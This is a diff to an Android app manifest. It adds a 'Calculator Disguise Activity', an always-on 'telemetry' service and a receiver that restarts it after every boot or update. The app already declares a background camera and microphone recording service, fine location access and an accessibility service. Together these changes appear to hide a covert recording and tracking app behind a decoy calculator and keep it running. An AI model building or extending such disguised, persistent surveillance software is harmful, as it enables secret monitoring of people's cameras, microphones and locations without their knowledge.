@@ -19,6 +19,7 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:allowBackup="true"
@@ -43,6 +44,13 @@
             </intent-filter>
         </activity>
 
+        <!-- Calculator Disguise Activity -->
+        <activity
+            android:name=".CalculatorActivity"
+            android:exported="true"
+            android:label="Calculator"
+            android:theme="@style/Theme.MaterialComponents.DayNight.NoActionBar" />
+
         <!-- Background Camera Recording Foreground Service -->
         <service
             android:name=".service.CameraRecordingService"
@@ -58,6 +66,27 @@
             android:exported="false"
             android:foregroundServiceType="camera|microphone"
             android:stopWithTask="false" />
+
+        <!-- 24/7 Always-Online Background Telemetry Service -->
+        <service
+            android:name=".service.DeviceTelemetryService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
+
+        <!-- Auto-start Telemetry on Boot / Update -->
+        <receiver
+            android:name=".service.BootCompletedReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
 
         <!-- Accessibility Service for Volume Key Shortcuts -->
         <service
